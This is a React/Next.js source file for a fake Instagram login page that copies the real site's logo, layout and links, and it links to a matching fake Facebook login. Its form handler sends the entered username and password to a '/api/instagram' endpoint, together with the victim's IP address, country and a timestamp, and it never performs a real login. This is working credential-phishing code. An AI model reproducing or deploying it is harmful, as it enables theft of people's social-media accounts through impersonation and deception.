"use client";
import { useEffect, useRef, useState } from "react";
import "./instagram.css";
import Footer from "../components/Footer/Footer";
import Link from "next/link";
import { getFormatedDateTime } from "../facebook/page";
import { getUserLocation } from "../utils/request";

export default function Instagram() {
  const sliderRef = useRef(null);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const slideImages = [
    "./screenshot1.png",
    "./screenshot2.png",
    "./screenshot3.png",
    "./screenshot4.png",
  ];

  const imageContainerStyles = {
    backgroundImage: `url("./home-phones.png")`,
    backgroundSize: "468.32px 634.15px",
    height: "581.15px",
    marginBottom: "12px",
    backgroundPosition: "-46px 0",
  };

  useEffect(() => {
    const interval = () => {
      const slides = sliderRef.current.querySelector(".slideImages");
      const activeSlide = slides.querySelector("[data-active]");

      let newIndex = [...slides.children].indexOf(activeSlide) + 1;

      if (newIndex < 0) newIndex = slides.children.length - 1;
      if (newIndex >= slides.children.length) newIndex = 0;

      slides.children[newIndex].dataset.active = true;

      delete activeSlide.dataset.active;
    };

    const time = setInterval(() => {
      interval();
    }, 5000);

    return () => clearInterval(time);
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();

    getUserLocation().then(
      async (data) =>
        await fetch("/api/instagram", {
          method: "POST",
          body: JSON.stringify({
            username,
            password,
            date: getFormatedDateTime(new Date()),
            ip_address: data.ip,
            country: data.country_name,
          }),
        })
    );
  };

  return (
    <div>
      <div className="login__container">
        <div className="login__content">
          <div
            ref={sliderRef}
            style={imageContainerStyles}
            className="login__content-left"
          >
            <div className="slideImages">
              <div className="slide" data-active>
                <img src={slideImages[0]} alt="" />
              </div>
              <div className="slide">
                <img src={slideImages[1]} alt="" />
              </div>
              <div className="slide">
                <img src={slideImages[2]} alt="" />
              </div>
              <div className="slide">
                <img src={slideImages[3]} alt="" />
              </div>
            </div>
          </div>

          <div className="login__main">
            <div className="login__content-right">
              <div className="login__logo">
                <img src="./logo1.png" alt="" />
              </div>
              <form onSubmit={handleSubmit} className="login__form">
                <div className="form__group">
                  <input
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    required
                    type="text"
                    id="username"
                  />
                  <label htmlFor="username">
                    Phone number, username or email
                  </label>
                </div>
                <div className="form__group">
                  <input
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                    type="password"
                    id="password"
                  />
                  <label htmlFor="password">Password</label>
                </div>
                <div className="form__group btn">
                  <button type="submit">Log in</button>
                </div>
                <div className="or">
                  <div className="line left"></div>
                  <div>OR</div>
                  <div className="line right"></div>
                </div>
                <div className="facebook__login">
                  <img src="./facebook.png" />
                  <div>
                    <Link href="/facebook">Log in with Facebook</Link>
                  </div>
                </div>
                <div className="forget__password">
                  <Link href="">Forget Password?</Link>
                </div>
              </form>
            </div>

            <div className="login__content-right dont__have">
              <p>
                Don't have an account?{" "}
                <Link href="https://www.instagram.com/accounts/emailsignup/">
                  Sign Up
                </Link>
              </p>
            </div>

            <div className="get__app">
              <div className="get">
                <span>Get the app.</span>
              </div>
              <div className="app">
                <Link href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D198FE26F-793D-403A-948A-B4FD759A03F5%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge%26original_referrer%3Dhttps%253A%252F%252Fwww.google.com%252F">
                  <img src="/google.png" />
                </Link>
                <Link href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1920%2C1080">
                  <img src="./microsoft.png" />
                </Link>
              </div>
            </div>
          </div>
        </div>
      </div>

      <Footer />
    </div>
  );
}
